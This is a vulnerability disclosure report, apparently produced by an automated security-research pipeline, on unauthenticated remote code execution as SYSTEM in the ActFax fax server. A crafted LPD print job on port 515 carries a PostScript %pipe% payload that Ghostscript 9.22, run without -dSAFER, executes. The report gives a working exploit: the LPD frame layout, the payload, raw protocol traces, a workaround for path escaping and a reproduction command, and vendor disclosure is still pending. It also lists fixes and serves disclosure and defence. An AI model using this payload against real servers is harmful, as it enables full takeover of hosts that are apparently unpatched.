# ActFax — Unauthenticated LPD Ghostscript %pipe% SYSTEM RCE

## 1. Product & Attack Surface

ActFax (ActiveFax Server) v10.70 Build 0609 (2026-04-07, latest) is a Windows fax server. Default deployment exposes multiple network services owned by `ActSrvNT.exe` (running as NT AUTHORITY\SYSTEM):

| Port | Protocol | Auth | Purpose |
|---|---|---|---|
| 21 | FTP | weak (plaintext) | fax file transfer |
| 23 | Telnet | none | remote configuration |
| **515** | **LPD/LPR** | **none (RFC 1179)** | **print job intake ← entry point** |
| 25017 | RAW print | none | raw print stream |
| 69/udp | TFTP | none | firmware/config |
| 25017/udp | — | — | — |

The LPD (RFC 1179) protocol has no authentication mechanism — any TCP connection to port 515 can submit a print job. ActFax's LPD is further relaxed: it accepts any queue name (no need to match a configured printer queue).

## 2. Root Cause: Ghostscript %pipe% without SAFER

Ghostscript version detected: `C:\gs922\Library\bin\gsdll64.dll` + registry `HKLM\SOFTWARE\WOW6432Node\GPL Ghostscript\9.22`. GS 9.22 < 9.50 and `-dSAFER` is not enabled by default — this is the key precondition for the `%pipe%` operator to execute shell commands (GS 9.50+ makes SAFER the default sandbox, blocking `%pipe%`).

### Sink: GS invocation (FUN_1401d0610)

- DLL mode: `LoadLibraryA("gsdll64.dll")` + `gsapi_init_with_args`
- EXE mode: `CreateProcessA("gsconvert.exe", "-dNOPAUSE -dBATCH -r200 -sOutputFile=%s -sDEVICE=ljet4|tiffg3 <input>")`
- **Neither mode contains `-dSAFER`** (zero occurrences of `-dSAFER`/`-dNOSAFER` in the binary) → GS sandbox disabled

## 3. Source: LPD 515 print job

The receiving path: LPD 515 → job queue (Faxlist directory) → send scheduler → GS rasterization.

`FUN_1401cd9d0` (document converter) receives fax documents and calls `FUN_1401d0610` (GS_invoke) to rasterize them. The trigger: a job containing the F-code `@F211 <fax number>@` (F211 = fax destination) enters the send scheduler → rasterization via GS.

F-code parsing: ActFax F-code format is `@F<code> <value>@`; F211 is the fax number/destination. Jobs containing F211 trigger the send flow, which rasterizes the document to a fax image → invokes GS.

## 4. Data Flow

```
Attacker TCP 515 (LPD)
  → ActFax LPD receives job (any queue name, no auth)
  → job body contains @F211 777777RCE@ + PostScript body
  → job enters Faxlist queue
  → send scheduler detects F211 destination
  → FUN_1401cd9d0 writes body to temp file
  → FUN_1401d0610 (GS_invoke) rasterizes (no -dSAFER)
  → GS 9.22 parses PostScript %pipe% operator
  → cmd /c <command> executes as ActSrvNT (SYSTEM)
```

## 5. Exploitation Details

### 5.1 LPD Frame Construction

LPD (RFC 1179) jobs consist of 5 subcommands, each of which must be sent as a single `byte[]` in one shot (fragmented `WriteByte` causes ActFax LPD to RST the connection):

| Step | Subcommand | Format | ack |
|------|------------|--------|-----|
| 1 | receive-job | `\x02 <queue> \n` | 0x00 |
| 2 | receive data file | `\x03 <len> <name> \n` | 0x00 |
| 3 | data content | `<data> \x00` | — |
| 4 | receive control file | `\x02 <len> <name> \n` | 0x00 |
| 5 | control content | `<control> \x00` | — |

Control file: `H<host>\nP<user>\nN<dfname>\n` (RFC 1179 control lines).

### 5.2 PostScript %pipe% Injection

Job body = F-code header + PostScript body:

```
@F211 777777RCE@\r\n
%!PS-Adobe-3.0\r\n
%%Title: RCE\r\n
(%pipe%cmd /c whoami > C:/rce_proof.txt) (w) file pop\r\n
showpage\r\n
%%EOF\r\n
```

**Key**: the PostScript `%pipe%` operator syntax `(%pipe%<command>) (w) file` opens a pipe for writing, executes `<command>`, and redirects output. When GS < 9.50 runs without SAFER, `%pipe%` executes shell commands with the invoking process's privileges.

### 5.3 The PostScript `\r` Path-Escape Bug (critical pitfall)

**Backslash paths trigger PostScript `\r` escaping**: `C:\rce_proof.txt` in a PS string literal is interpreted as `C:` + `\r` (CR escape) + `ece_proof.txt` — the filename is truncated to `ece_proof.txt`, written to GS's current working directory (`C:\Program Files\ActiveFax\`) instead of `C:\rce_proof.txt`.

**Solution**: use forward slashes `C:/rce_proof.txt` (Windows accepts forward slashes) or double backslashes `C:\\rce_proof.txt`.

> This bug caused an adversarial-verification gate to initially misjudge the vulnerability as not reproducible (the verifier looked for the marker at `C:\rce_...` while it was actually written to `C:\Program Files\ActiveFax\ce_...` truncated by `\r`). After switching to forward slashes the marker landed at the expected path and the vulnerability was confirmed.

## 6. Complete Data Flow

```
[ActSrvNT.exe service, NT AUTHORITY\SYSTEM]
   │ LPD subcommands: \x02 queue\n → \x03 len name\n → data\x00 → \x02 len name\n → ctrl\x00
   │ all acked 0x00 (job accepted)
   ▼
[Job body parsing]
   │ @F211 777777RCE@\r\n   ← F-code fax destination (triggers send scheduler)
   │ %!PS-Adobe-3.0\r\n     ← PostScript body header
   │ (%pipe%cmd /c whoami > C:/rce_proof.txt) (w) file pop   ← %pipe% injection
   │ showpage\r\n%%EOF\r\n
   ▼
[Send scheduler → FUN_1401cd9d0 document conversion]
   │ WriteFile writes PS body to temp file
   │ calls FUN_1401d0610 (GS_invoke)
   ▼
[FUN_1401d0610 GS_invoke] (no -dSAFER)
   │ gsconvert.exe -sDEVICE=ljet4 -dNOPAUSE -dBATCH -r200 -sOutputFile=<out> <tmp>
   ▼
[Ghostscript 9.22 < 9.50, -dSAFER not default]
   │ parses PostScript: (%pipe%cmd /c whoami > C:/rce_proof.txt) (w) file pop
   │ %pipe% operator: executes shell command as invoking process (ActSrvNT=SYSTEM)
   ▼
[NT AUTHORITY\SYSTEM RCE]
   │ cmd /c whoami > C:/rce_proof.txt
   ▼
marker file C:\rce_proof.txt content = "nt authority\system"
```

## 7. Dynamic Verification

### 7.1 Verification Environment

| Item | Value |
|------|-------|
| Target | Windows Server, ActFax v10.70 Build 0609, ActSrvNT.exe PID 3432, NT AUTHORITY\SYSTEM |
| GS | 9.22, gsdll64.dll |
| LPD | 0.0.0.0:515, owning process = ActSrvNT |
| SSH user | non-SYSTEM account (used to exclude SSH-written markers) |
| Attack origin | network-reachable client (LPD port open on 0.0.0.0) |

### 7.2 Decisive Verification (forward-slash marker)

- Pre-test: delete the marker file, confirm it does not exist.
- Send LPD job: queue `rcefinal`, fax number `777777FINAL`, PS body containing `(%pipe%cmd /c whoami > C:/rce_final_proof.txt) (w) file pop`.
- LPD ack: all 5 steps return 0x00 (job accepted).
- Process monitoring (WMI Win32_ProcessStartTrace): 4 cmd.exe spawns captured (GS %pipe% child processes).
- Result: marker file appears, 21 bytes, content `nt authority\system`.

### 7.3 Raw Protocol Evidence

LPD is a binary protocol (not HTTP); key interactions with single-byte acks:

```
[send] \x02 rcefinal\n                                  (receive-job)
[recv] \x00                                              (ack success)
[send] \x03 152 dfA001actfax\n                           (receive data file, len=152)
[recv] \x00                                              (ack success)
[send] @F211 777777FINAL@\r\n%!PS-Adobe-3.0\r\n...(%pipe%cmd /c whoami > C:/rce_final_proof.txt) (w) file pop\r\nshowpage\r\n%%EOF\r\n\x00
[send] \x02 36 cfaA001actfax\n                           (receive control file)
[recv] \x00                                              (ack success)
[send] Hactfax-rce\nPrceuser\nNdfA001actfax\n\x00
[wait 12 seconds — ActFax send scheduler processing]
[target] C:\rce_final_proof.txt created, 21 bytes
[target] content (hex): 6E-74-20-61-75-74-68-6F-72-69-74-79-5C-73-79-73-74-65-6D-0D-0A
[target] content (ASCII): nt authority\system\r\n
```

### 7.4 Independent Adversarial Re-verification

An independent verification agent used a fresh unique marker to reproduce:
- LPD 5-step acks all 0x00
- Marker appears after ~20s, 21 bytes, `nt authority\system`
- Confounding factors excluded: SSH user ≠ SYSTEM; no scheduled-task alternative; GS 9.22 < 9.50 without -dSAFER; port 515 on 0.0.0.0; default configuration
- **VERDICT: CONFIRMED (HIGH confidence)**

## 8. Reachability

- Remote reachable: LPD 515 listens on 0.0.0.0; any network position that can reach the port can trigger it.
- Default configuration: LPD 515 is ActFax's default print-service integration port; GS 9.22 is the vendor-recommended bundled version; the `@F211` F-code is a standard fax-destination directive. No special configuration required.
- No user interaction: the attacker actively sends the LPD job; no victim action needed.

## 9. Impact & Fix Recommendations

**Impact**: Pre-auth RCE as SYSTEM on the ActFax host; full system compromise.

**Fix recommendations**:
1. Upgrade the bundled Ghostscript to >= 9.50 (SAFER becomes the default sandbox, blocking `%pipe%`) — the most critical fix
2. Explicitly add `-dSAFER` to the GS command line in `GS_invoke` (even with GS < 9.50)
3. Restrict/authenticate LPD 515 at the network layer or disable the LPD receive channel
4. Whitelist PostScript operators in received fax bodies; forbid dangerous operators (`%pipe%`, `run`, `file`)
5. Run ActSrvNT with least privilege instead of LocalSystem

## 10. Reproduction

```bash
python3 actfax_lpd_gs_pipe_rce.py <TARGET_IP> "cmd /c whoami > C:/rce_proof.txt"
# wait ~12 seconds, then verify on the target:
# C:\rce_proof.txt content: nt authority\system
```

## 11. References

- Ghostscript SAFER mode: `-dSAFER` became default in GS 9.50 (CVE-2018-19134 and the %pipe% vulnerability family)
- LPD protocol: RFC 1179 (designed without authentication)
- ActFax F-code: `@F211` = fax number/destination (ActFax programming manual)

## 12. Timeline & Disclosure Status

- Research completed and dynamically verified: 2026-08
- Vendor notification, CVE, and public disclosure channels: pending operator approval (Batch #6)
